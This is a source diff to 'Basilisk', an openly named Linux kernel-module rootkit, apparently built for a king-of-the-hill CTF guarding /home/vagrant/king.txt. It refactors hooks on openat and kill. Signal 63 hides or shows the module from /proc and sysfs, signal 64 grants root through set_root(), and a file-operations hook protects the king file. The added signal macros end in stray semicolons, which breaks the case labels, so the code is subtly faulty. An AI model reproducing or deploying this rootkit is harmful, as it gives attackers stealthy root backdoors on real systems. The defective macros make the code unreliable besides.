@@ -18,28 +18,32 @@
 #include "include/stealth_helper.h"
 
 
+// Macros for the kill hook commands
+#define SIG_HIDE 63;
+#define SIG_ROOT 64;
+
 // Macros for protecting king.txt
-#define KING_FILENAME "/home/vagrant/king.txt"
+#define KING_FILENAME "/home/vagrant/king.txt" // Path to king file
 #define KING_FILENAME_LEN strlen(KING_FILENAME)
 
-#define KING "SKELLY\n"
+#define KING "SKELLY\n" // King
 #define KING_LEN strlen(KING)
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Skelly");
 MODULE_DESCRIPTION("Basilisk LKM Rootkit");
-MODULE_VERSION("0.02");
+MODULE_VERSION("2.0");
 
 #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
 #define PTREGS_SYSCALL_STUBS 1
 #endif
 
 static short hidden = 0;
-struct file_operations *king_fops;
+static struct file_operations *king_fops;
 static DEFINE_RWLOCK(king_fops_lock);
 
 /* Cleanup the king_fops struct*/
-static void cleanup_new_fops(void) {
+static void cleanup_fops(void) {
     kfree(king_fops); 
     king_fops = NULL; // prevent dangling pointer access
 }
@@ -148,7 +152,11 @@ static long handle_fops_poisoning(int fd, const char *full_path) {
     return fd;
 }
 
-
+/*
+sys_openat hook. 
+Resolves the filename from the file descriptor and poisons its file operations struct if it matches our target file.
+Otherwise it returns the original openat syscall.
+*/
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_openat)(const struct pt_regs *);
 
@@ -216,11 +224,15 @@ static asmlinkage long hook_openat(int dfd, const char __user *filename, int fla
 }
 #endif
 
-/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
- * declare the orig_kill and hook_kill functions differently
- * depending on the kernel version. This is the largest barrier to 
- * getting the rootkit to work on earlier kernel versions. The
- * more modern way is to use the pt_regs struct. */
+/*
+Kill syscall hook.
+Intercepts signals to communicate with the adversary.
+
+Signal SIG_HIDE calls hide_basilisk/show_basilisk depending on the `hidden` toggle
+Signal SIG_ROOT calls set_root
+
+Otherwise it calls the original kill syscall.
+*/
 
 #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
@@ -234,19 +246,11 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
     int sig = regs->si;
 
     switch (sig) {
-        case 63:
-            if (hidden) 
-            {
-                printk(KERN_INFO "basilisk: showing kernel module...\n");
-                show_basilisk();
-            } else 
-            {
-                printk(KERN_INFO "basilisk: hiding kernel module...\n");
-                hide_basilisk();
-            };
+        case SIG_HIDE:
+            handle_lkm_hide();
             break;
 
-        case 64:
+        case SIG_ROOT:
             printk(KERN_INFO "basilisk: giving root...\n");
             set_root();
             break;
@@ -268,45 +272,37 @@ asmlinkage int hook_kill(pid_t pid, int sig)
     void hide_basilisk(void);
     
     switch (sig) {
-        case 63:
-            if (hidden) 
-            {
-                printk(KERN_INFO "basilisk: showing kernel module...\n");
-                show_basilisk();
-            } else 
-            {
-                printk(KERN_INFO "basilisk: hiding kernel module...\n");
-                hide_basilisk();
-            };
+        case SIG_HIDE:
+            handle_lkm_hide();
             break;
 
-        case 65:
+        case SIG_ROOT:
             printk(KERN_INFO "basilisk: giving root...\n");
             set_root();
             break;
        
         default:
             return orig_kill(pid, sig);
-
     }
     return 0;
 }
 #endif
 
 /*
-Helper functions to handle the hiding/showing of our LKM 
+Helper function to handle hiding/showing our LKM 
 */
-void hide_basilisk(void)
+void handle_lkm_hide(void)
 {
-    proc_hide();
-    sys_hide();
-    hidden = 1;
-}
-void show_basilisk(void)
-{
-    proc_show();
-    sys_show();
-    hidden = 0;
+    if(!hidden) {
+        pr_info("basilisk: hiding kernel module...\n");
+        proc_hide();
+        sys_hide();
+    } else {
+        pr_info("basilisk: showing kernel module...\n");
+        proc_show();
+        sys_show();
+    }
+    hidden = !hidden; // toggle `hidden` switch
 }
 
 void set_root(void)
@@ -349,7 +345,7 @@ static int __init basilisk_init(void)
 
 static void __exit basilisk_exit(void)
 {
-    cleanup_new_fops();
+    cleanup_fops(); // free king_fops
     /* Unhook and restore the syscalls */
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     printk(KERN_INFO "basilisk: unloaded\n");
